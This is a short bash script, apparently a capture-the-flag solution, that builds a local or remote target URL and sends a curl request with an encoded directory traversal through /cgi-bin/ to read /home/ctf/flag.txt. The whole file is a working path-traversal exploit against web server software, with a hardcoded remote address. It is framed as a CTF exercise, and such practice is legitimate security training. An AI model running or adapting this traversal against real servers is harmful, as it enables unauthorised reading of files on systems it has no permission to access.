#!/bin/bash

PORT=8080

if [[ $1 == "local" ]]
then
    URL='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]]
then
    URL='http://141.85.224.105:'$PORT
elif [[ $# -ne 2 ]]
then
    echo "Usage:"
    echo $0" {local,remote}"
    echo "or"
    echo $0" <ip> <port>"
    exit 1
else
    URL=$1':'$2
fi

curl $URL/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/ctf/flag.txt